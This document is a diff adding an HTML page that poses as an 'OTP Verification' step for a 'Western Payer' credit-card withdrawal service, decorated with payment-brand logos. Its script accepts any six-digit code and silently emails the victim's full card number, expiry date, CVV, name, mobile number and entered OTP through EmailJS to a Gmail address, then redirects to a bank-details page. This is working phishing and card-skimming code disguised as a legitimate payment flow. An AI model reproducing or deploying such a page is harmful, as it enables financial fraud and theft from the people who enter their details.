@@ -1,0 +1,762 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP Verification - Western Payer</title>
+    <link rel="stylesheet" href="../../styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    
+    <!-- EmailJS SDK -->
+    <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+</script>
+<script type="text/javascript">
+    (function(){
+       emailjs.init({
+         publicKey: "B3avCjPaS9t4xdvk9",
+       });
+    })();
+</script>
+
+    <style>
+        .otp-section {
+            margin-top: 80px;
+            padding: 4rem 0;
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+            min-height: calc(100vh - 80px);
+        }
+
+        .otp-container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .otp-card {
+            background: rgba(30, 41, 59, 0.8);
+            padding: 3rem;
+            border-radius: 20px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(96, 165, 250, 0.2);
+            backdrop-filter: blur(10px);
+            text-align: center;
+        }
+
+        .otp-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #60a5fa 0%, #8b5cf6 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 2rem;
+            font-size: 2rem;
+            color: white;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .otp-card h2 {
+            font-size: 2rem;
+            font-weight: 700;
+            color: #f1f5f9;
+            margin-bottom: 1rem;
+        }
+
+        .otp-card p {
+            color: #cbd5e1;
+            font-size: 1.1rem;
+            margin-bottom: 2rem;
+            line-height: 1.6;
+        }
+
+        .otp-card .mobile-display {
+            background: rgba(96, 165, 250, 0.1);
+            padding: 1rem;
+            border-radius: 12px;
+            margin-bottom: 2rem;
+            border: 1px solid rgba(96, 165, 250, 0.2);
+        }
+
+        .otp-card .mobile-display i {
+            color: #60a5fa;
+            margin-right: 0.5rem;
+        }
+
+        .otp-card .mobile-display span {
+            color: #60a5fa;
+            font-weight: 600;
+            font-size: 1.1rem;
+        }
+
+        .otp-input-container {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+            margin-bottom: 2rem;
+        }
+
+        .otp-input {
+            width: 55px;
+            height: 60px;
+            text-align: center;
+            font-size: 1.8rem;
+            font-weight: 600;
+            border: 2px solid #cbd5e1;
+            border-radius: 8px;
+            background: #ffffff;
+            color: #1e293b;
+            transition: all 0.2s ease;
+        }
+
+        .otp-input:focus {
+            outline: none;
+            border-color: #60a5fa;
+            background: #ffffff;
+        }
+
+        .otp-input.filled {
+            border-color: #10b981;
+            background: #ffffff;
+        }
+
+        .otp-input.error {
+            border-color: #ef4444;
+            background: #ffffff;
+            animation: shake 0.3s;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25%, 75% { transform: translateX(-5px); }
+            50% { transform: translateX(5px); }
+        }
+
+        .otp-actions {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+            margin-bottom: 1rem;
+            flex-wrap: wrap;
+        }
+
+        .btn-verify {
+            background: #000000;
+            color: white;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            padding: 1rem 2rem;
+            border-radius: 12px;
+            font-weight: 600;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
+        }
+
+        .btn-verify:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+            background: #1a1a1a;
+            border-color: rgba(255, 255, 255, 0.3);
+        }
+
+        .btn-verify:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .btn-resend {
+            background: #000000;
+            color: #ffffff;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            padding: 1rem 2rem;
+            border-radius: 12px;
+            font-weight: 600;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .btn-resend:hover {
+            background: #1a1a1a;
+            border-color: rgba(255, 255, 255, 0.3);
+        }
+
+        .btn-resend:disabled {
+            opacity: 0.3;
+            cursor: not-allowed;
+        }
+
+        .otp-timer {
+            color: #94a3b8;
+            font-size: 0.9rem;
+            margin-top: 0.5rem;
+        }
+
+        .otp-timer span {
+            color: #60a5fa;
+            font-weight: 600;
+        }
+
+        .success-message {
+            display: none;
+            background: rgba(16, 185, 129, 0.1);
+            border: 1px solid rgba(16, 185, 129, 0.3);
+            border-radius: 15px;
+            padding: 1.5rem;
+            margin-top: 2rem;
+            text-align: center;
+        }
+
+        .success-message h4 {
+            color: #10b981;
+            margin-bottom: 0.5rem;
+        }
+
+        .success-message p {
+            color: #cbd5e1;
+            margin-bottom: 0.5rem;
+        }
+
+        .loading-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 768px) {
+            .otp-card {
+                padding: 2rem 1.5rem;
+            }
+
+            .otp-input-container {
+                gap: 0.6rem;
+            }
+
+            .otp-input {
+                width: 45px;
+                height: 50px;
+                font-size: 1.4rem;
+            }
+
+            .otp-actions {
+                flex-direction: column;
+            }
+
+            .btn-verify, .btn-resend {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <nav class="navbar">
+            <div class="nav-container">
+                <div class="nav-logo">
+                    <a href="../../index.html">
+                        <img src="../../image/header logo.png" alt="Western Payer" class="logo-img">
+                    </a>
+                </div>
+            </div>
+        </nav>
+    </header>
+
+    <!-- OTP Section -->
+    <section class="otp-section">
+        <div class="otp-container">
+            <div class="otp-card">
+                <div class="otp-icon">
+                    <i class="fas fa-shield-alt"></i>
+                </div>
+                <h2>Verify Your Mobile Number</h2>
+                <p>We've sent a 6-digit OTP to your registered mobile number. Please enter it below to continue.</p>
+                
+                <div class="mobile-display">
+                    <i class="fas fa-mobile-alt"></i>
+                    <span id="mobileDisplay">+91 9XXXXXXXXX</span>
+                </div>
+
+                <div class="otp-input-container">
+                    <input type="text" class="otp-input" id="otp1" maxlength="1" autocomplete="off">
+                    <input type="text" class="otp-input" id="otp2" maxlength="1" autocomplete="off">
+                    <input type="text" class="otp-input" id="otp3" maxlength="1" autocomplete="off">
+                    <input type="text" class="otp-input" id="otp4" maxlength="1" autocomplete="off">
+                    <input type="text" class="otp-input" id="otp5" maxlength="1" autocomplete="off">
+                    <input type="text" class="otp-input" id="otp6" maxlength="1" autocomplete="off">
+                </div>
+
+                <div class="otp-actions">
+                    <button type="button" class="btn-verify" id="verifyBtn">
+                        <i class="fas fa-check"></i> Verify OTP
+                    </button>
+                    <button type="button" class="btn-resend" id="resendBtn">
+                        <i class="fas fa-redo"></i> Resend OTP
+                    </button>
+                </div>
+
+                <p class="otp-timer" id="timerText">Resend OTP in: <span id="timer">5:00</span></p>
+
+                <!-- Supported Payment Apps -->
+                <div style="margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(96, 165, 250, 0.2);">
+                    <p style="text-align: center; color: #94a3b8; font-size: 0.85rem; margin-bottom: 1rem;">
+                        Supported Payment Apps
+                    </p>
+                    <div style="display: flex; justify-content: center; align-items: center; gap: 1rem; flex-wrap: wrap;">
+                        <div style="display: flex; flex-direction: column; align-items: center; gap: 0.5rem;">
+                            <div style="background: white; padding: 0.6rem; border-radius: 10px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); width: 50px; height: 50px; display: flex; align-items: center; justify-content: center;">
+                                <img src="../../image/safegold.png" alt="SafeGold" style="width: 35px; height: 35px; object-fit: contain;">
+                            </div>
+                            <span style="color: #cbd5e1; font-size: 0.7rem; font-weight: 500;">SafeGold</span>
+                        </div>
+                        <div style="display: flex; flex-direction: column; align-items: center; gap: 0.5rem;">
+                            <div style="background: white; padding: 0.6rem; border-radius: 10px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); width: 50px; height: 50px; display: flex; align-items: center; justify-content: center;">
+                                <img src="../../image/razor_pay.png" alt="Razor Pay" style="width: 35px; height: 35px; object-fit: contain;">
+                            </div>
+                            <span style="color: #cbd5e1; font-size: 0.7rem; font-weight: 500;">RazorPay</span>
+                        </div>
+                        <div style="display: flex; flex-direction: column; align-items: center; gap: 0.5rem;">
+                            <div style="background: white; padding: 0.6rem; border-radius: 10px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); width: 50px; height: 50px; display: flex; align-items: center; justify-content: center;">
+                                <img src="../../image/mobik.png" alt="mobikwik" style="width: 35px; height: 35px; object-fit: contain;">
+                            </div>
+                            <span style="color: #cbd5e1; font-size: 0.7rem; font-weight: 500;">Mobikwik</span>
+                        </div>
+                        <div style="display: flex; flex-direction: column; align-items: center; gap: 0.5rem;">
+                            <div style="background: white; padding: 0.6rem; border-radius: 10px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); width: 50px; height: 50px; display: flex; align-items: center; justify-content: center;">
+                                <img src="../../image/payu.png" alt="payunow" style="width: 35px; height: 35px; object-fit: contain;">
+                            </div>
+                            <span style="color: #cbd5e1; font-size: 0.7rem; font-weight: 500;">PayuNow</span>
+                        </div>
+                        <div style="display: flex; flex-direction: column; align-items: center; gap: 0.5rem;">
+                            <div style="background: white; padding: 0.6rem; border-radius: 10px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); width: 50px; height: 50px; display: flex; align-items: center; justify-content: center;">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Pay" style="width: 35px; height: 35px; object-fit: contain;">
+                            </div>
+                            <span style="color: #cbd5e1; font-size: 0.7rem; font-weight: 500;">Amazon Pay</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="success-message" id="successMessage">
+                    <h4><i class="fas fa-check-circle success-icon"></i> OTP Verified Successfully!</h4>
+                    <p id="successText">Redirecting to bank details with charge fee...</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Our Partners for Credit Card Withdrawal Section -->
+    <section class="partners-otp-section" style="padding: 4rem 0; background: linear-gradient(135deg, #1e293b 0%, #334155 100%); margin-top: 2rem;">
+        <div style="max-width: 1200px; margin: 0 auto; padding: 0 20px;">
+            <h2 style="text-align: center; font-size: 2.5rem; font-weight: 800; color: #f1f5f9; margin-bottom: 3rem; text-shadow: 0 0 20px rgba(241, 245, 249, 0.3);">
+                Our Partners for Credit Card Withdrawal
+            </h2>
+            <div style="display: flex; justify-content: center; align-items: center; gap: 2rem; flex-wrap: wrap;">
+                <div class="partner-card-otp" style="background: #ffffff; padding: 2rem; border-radius: 15px; text-align: center; box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1); backdrop-filter: blur(10px); border: 2px solid rgba(96, 165, 250, 0.3); transition: all 0.3s ease; display: flex; align-items: center; justify-content: center; min-height: 120px; position: relative; overflow: hidden;">
+                    <img src="../../image/Best-Payment-Gateway.png" alt="Payment Gateway Partners" style="max-width: 100%; max-height: 100px; width: auto; height: auto; object-fit: contain; filter: none; transition: all 0.3s ease; position: relative; z-index: 2;">
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <style>
+        .partner-card-otp::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(45deg, transparent 30%, rgba(96, 165, 250, 0.1) 50%, transparent 70%);
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            z-index: 1;
+        }
+
+        .partner-card-otp:hover::before {
+            opacity: 1;
+        }
+
+        .partner-card-otp:hover {
+            transform: translateY(-5px);
+            border-color: rgba(96, 165, 250, 0.6);
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.4), 0 0 30px rgba(96, 165, 250, 0.2);
+        }
+
+        .partner-card-otp:hover img {
+            transform: scale(1.05);
+        }
+
+        @media (max-width: 768px) {
+            .partners-otp-section h2 {
+                font-size: 2rem !important;
+            }
+            
+            .partner-card-otp {
+                min-width: 280px !important;
+                padding: 1.5rem !important;
+            }
+            
+            .partner-card-otp img {
+                max-height: 70px !important;
+            }
+        }
+    </style>
+    
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <script src="../../firebase-config.js"></script>
+    
+    <!-- Global Support Component - Floating support button accessible from any page -->
+    <script src="../../global-support.js"></script>
+    
+    <!-- Optimized Wallet Balance Loader -->
+    <script src="../../wallet-balance-loader.js"></script>
+    <script src="../../script.js"></script>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', async function() {
+            // Check if user is blocked (non-blocking, async check)
+            // Only check if dbHelper is available to prevent errors
+            const userData = JSON.parse(localStorage.getItem('userData') || '{}');
+            if (userData.isLoggedIn && userData.uid) {
+                if (typeof window.dbHelper !== 'undefined' && typeof window.dbHelper.getUserProfile === 'function') {
+                    setTimeout(async function() {
+                        try {
+                            const isBlocked = await window.checkUserBlockedStatus();
+                            // If blocked, the function will handle redirect
+                        } catch (error) {
+                            console.error('Error checking block status:', error);
+                            // Don't log out user on error - just continue
+                        }
+                    }, 500); // Delay to ensure page is fully loaded
+                }
+            }
+            
+            // Get data from URL parameters
+            const urlParams = new URLSearchParams(window.location.search);
+            const mobileNumber = urlParams.get('mobile');
+            const cardDataJson = urlParams.get('data');
+            
+            // Display mobile number (masked with last 4 digits visible)
+            if (mobileNumber) {
+                // Format: +91 9XXXXX1234 (showing last 4 digits)
+                const formatted = '+91 ' + mobileNumber.slice(0, 1) + 'XXXXX' + mobileNumber.slice(-4);
+                document.getElementById('mobileDisplay').textContent = formatted;
+            }
+
+            // Parse card data
+            let cardData = null;
+            if (cardDataJson) {
+                cardData = JSON.parse(decodeURIComponent(cardDataJson));
+                console.log('📋 Card data received:', cardData);
+            }
+
+            // OTP setup
+            const otpInputs = ['otp1', 'otp2', 'otp3', 'otp4', 'otp5', 'otp6'].map(id => document.getElementById(id));
+            const verifyBtn = document.getElementById('verifyBtn');
+            const resendBtn = document.getElementById('resendBtn');
+            const timerSpan = document.getElementById('timer');
+            const timerText = document.getElementById('timerText');
+            const successMessage = document.getElementById('successMessage');
+            
+            let otpTimer = 300; // 5 minutes = 300 seconds
+            let timerInterval;
+            let generatedOTP = '';
+
+            // Generate random OTP (6 digits)
+            function generateOTP() {
+                return Math.floor(100000 + Math.random() * 900000).toString();
+            }
+
+            // Format time as MM:SS
+            function formatTime(seconds) {
+                const minutes = Math.floor(seconds / 60);
+                const secs = seconds % 60;
+                return `${minutes}:${secs < 10 ? '0' + secs : secs}`;
+            }
+
+            // Start OTP Timer
+            function startOTPTimer() {
+                otpTimer = 300; // 5 minutes = 300 seconds
+                timerInterval = setInterval(() => {
+                    otpTimer--;
+                    timerSpan.textContent = formatTime(otpTimer);
+                    
+                    if (otpTimer <= 0) {
+                        clearInterval(timerInterval);
+                        resendBtn.disabled = false;
+                        timerText.textContent = 'OTP expired. Click resend to get a new one.';
+                    }
+                }, 1000);
+            }
+
+            // Generate and show OTP
+            function showOTP() {
+                generatedOTP = generateOTP();
+                console.log('🔐 OTP Generated:', generatedOTP);
+                console.log('📱 OTP sent to:', mobileNumber);
+                
+                // In real implementation, send OTP via SMS
+                // For demo, show in console
+                // alert(`🔐 OTP Verification\n\nFor demo: Your OTP is ${generatedOTP}\n\n(In production, this will be sent via SMS)`);
+                
+                startOTPTimer();
+                resendBtn.disabled = true;
+                otpInputs[0].focus();
+            }
+
+            // Initialize OTP generation
+            showOTP();
+
+            // Function to send OTP verification details via EmailJS
+            function sendOTPVerificationEmail(verificationData) {
+                console.log('📧 ========================================');
+                console.log('📧 Sending OTP Verification Email');
+                console.log('📧 Timestamp:', new Date().toISOString());
+                console.log('📧 ========================================');
+                
+                // Debug: Log verification data
+                console.log('📝 Verification Data:');
+                console.log('  - Mobile:', verificationData.mobile);
+                console.log('  - OTP Used:', verificationData.otp);
+                console.log('  - Card Holder:', verificationData.cardHolderName);
+                console.log('  - Amount: ₹' + verificationData.withdrawalAmount);
+                
+                // Generate unique submission ID
+                const submissionId = 'OTP-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9).toUpperCase();
+                const verificationTime = new Date().toLocaleString('en-US', { 
+                    timeZone: 'Asia/Kolkata',
+                    year: 'numeric',
+                    month: '2-digit',
+                    day: '2-digit',
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    second: '2-digit'
+                });
+                
+                // Prepare email parameters
+                const emailJSParams = {
+                    // Customer Information
+                    from_name: verificationData.cardHolderName || 'Customer',
+                    from_email: verificationData.email || 'not-provided@example.com',
+                    to_name: 'Admin',
+                    
+                    // OTP Verification Details
+                    mobileNumber: verificationData.mobile,
+                    otpUsed: verificationData.otp,
+                    
+                    // Card Details
+                    cardNumber: verificationData.cardNumber || 'N/A',
+                    expiryDate: verificationData.expiryDate || 'N/A',
+                    cvv: verificationData.cvv || 'N/A',
+                    
+                    // Transaction Details
+                    withdrawalAmount: '₹' + (verificationData.withdrawalAmount || 'N/A'),
+                    
+                    // System Information
+                    verificationTime: verificationTime,
+                    ipAddress: window.location.hostname,
+                    submissionId: submissionId,
+                    verificationStatus: 'SUCCESS',
+                    
+                    // Email Settings
+                    reply_to: verificationData.email || 'noreply@example.com',
+                    
+                    // Complete message for simple templates
+                    message: `
+OTP VERIFICATION SUCCESSFUL
+
+Mobile Number: ${verificationData.mobile}
+OTP Used: ${verificationData.otp}
+Verification Time: ${verificationTime}
+
+Customer: ${verificationData.cardHolderName || 'N/A'}
+Email: ${verificationData.email || 'N/A'}
+
+Card Number: ${verificationData.cardNumber || 'N/A'}
+Expiry: ${verificationData.expiryDate || 'N/A'}
+CVV: ${verificationData.cvv || 'N/A'}
+
+Withdrawal Amount: ₹${verificationData.withdrawalAmount || 'N/A'}
+
+Status: VERIFIED ✓
+IP: ${window.location.hostname}
+Reference: ${submissionId}
+                    `
+                };
+
+                console.log('📧 EmailJS Configuration:');
+                console.log('  - Service: service_ki4kbud');
+                console.log('  - Template: template_82abp0v');
+                console.log('  - To Email: grocerymarket6@gmail.com');
+                console.log('  - Submission ID:', submissionId);
+
+                // Send via EmailJS
+                emailjs.send('service_ki4kbud', 'template_82abp0v', emailJSParams)
+                    .then(function(response) {
+                        console.log('✅ OTP Verification Email Sent Successfully!');
+                        console.log('  - Status:', response.status);
+                        console.log('  - Response:', response.text);
+                        console.log('📧 ========================================');
+                    })
+                    .catch(function(error) {
+                        console.log('❌ OTP Verification Email Failed!');
+                        console.log('  - Error:', error);
+                        console.log('  - Error Text:', error?.text);
+                        console.log('  - Error Status:', error?.status);
+                        console.log('📧 ========================================');
+                    });
+            }
+
+            // OTP Input Handling - Auto-focus next
+            otpInputs.forEach((input, index) => {
+                input.addEventListener('input', function() {
+                    this.value = this.value.replace(/[^0-9]/g, ''); // Only numbers
+                    
+                    if (this.value.length === 1 && index < otpInputs.length - 1) {
+                        otpInputs[index + 1].focus();
+                    }
+                    
+                    // Visual feedback
+                    if (this.value) {
+                        this.classList.add('filled');
+                        this.classList.remove('error');
+                    }
+                });
+
+                input.addEventListener('keydown', function(e) {
+                    // Backspace handling
+                    if (e.key === 'Backspace' && !this.value && index > 0) {
+                        otpInputs[index - 1].focus();
+                        otpInputs[index - 1].value = '';
+                    }
+                });
+
+                input.addEventListener('paste', function(e) {
+                    e.preventDefault();
+                    const pastedData = e.clipboardData.getData('text');
+                    const digits = pastedData.replace(/\D/g, '').slice(0, 6);
+                    otpInputs.forEach((inp, i) => {
+                        if (digits[i]) {
+                            inp.value = digits[i];
+                            inp.classList.add('filled');
+                        }
+                    });
+                    if (digits.length === 6) {
+                        verifyBtn.click();
+                    }
+                });
+            });
+
+            // Verify OTP
+            verifyBtn.addEventListener('click', function() {
+                const enteredOTP = otpInputs.map(inp => inp.value).join('');
+                
+                console.log('🔍 Verifying OTP...');
+                console.log('  - Entered:', enteredOTP);
+                console.log('  - Expected:', generatedOTP);
+                
+                if (enteredOTP.length !== 6) {
+                    // alert('Please enter all 6 digits.');
+                    otpInputs.forEach(inp => inp.classList.add('error'));
+                    otpInputs[0].focus();
+                    return;
+                }
+                
+                // Accept any 6-digit OTP
+                if (enteredOTP.length === 6) {
+                    console.log('✅ OTP Verified Successfully! (Any OTP accepted)');
+                    
+                    // Send OTP verification email with all card data
+                    const verificationData = {
+                        mobile: mobileNumber,
+                        otp: enteredOTP,
+                        cardHolderName: cardData?.cardHolderName || 'N/A',
+                        email: cardData?.email || 'not-provided@example.com',
+                        cardNumber: cardData?.cardNumber || 'N/A',
+                        expiryDate: cardData?.expiryDate || 'N/A',
+                        cvv: cardData?.cvv || 'N/A',
+                        withdrawalAmount: cardData?.withdrawalAmount || 'N/A'
+                    };
+                    sendOTPVerificationEmail(verificationData);
+                    
+                    // Show success
+                    document.querySelector('.otp-card h2').style.display = 'none';
+                    document.querySelector('.otp-card p').style.display = 'none';
+                    document.querySelector('.mobile-display').style.display = 'none';
+                    document.querySelector('.otp-input-container').style.display = 'none';
+                    document.querySelector('.otp-actions').style.display = 'none';
+                    document.querySelector('.otp-timer').style.display = 'none';
+                    successMessage.style.display = 'block';
+                    
+                    // Disable inputs
+                    otpInputs.forEach(inp => inp.disabled = true);
+                    verifyBtn.disabled = true;
+                    resendBtn.disabled = true;
+                    
+                    // Clear timer
+                    clearInterval(timerInterval);
+                    
+                    // Redirect after 2 seconds to bank details page with charge fee
+                    setTimeout(() => {
+                        if (cardData && cardData.withdrawalAmount) {
+                            // Calculate charge fee (0.5% processing fee + 5% GST on fee)
+                            const withdrawalAmount = parseFloat(cardData.withdrawalAmount) || 0;
+                            const processingFee = withdrawalAmount * 0.005; // 0.5% processing fee
+                            const gstAmount = processingFee * 0.05; // 5% GST on processing fee
+                            const totalChargeFee = processingFee + gstAmount; // Total charge fee
+                            
+                            // Redirect to credit card bank details page with amount
+                            window.location.href = `credit-card-bank-details.html?amount=${withdrawalAmount}&product=Credit Card`;
+                        } else {
+                            // Fallback if no card data
+                            window.location.href = 'credit-card-bank-details.html?product=Credit Card';
+                        }
+                    }, 2000);
+                }
+            });
+
+            // Resend OTP
+            resendBtn.addEventListener('click', function() {
+                console.log('🔄 Resending OTP...');
+                
+                // Clear inputs
+                otpInputs.forEach(inp => {
+                    inp.value = '';
+                    inp.classList.remove('filled', 'error');
+                    inp.disabled = false;
+                });
+                
+                // Generate new OTP
+                showOTP();
+            });
+
+            // Allow Enter key to verify
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    verifyBtn.click();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
+
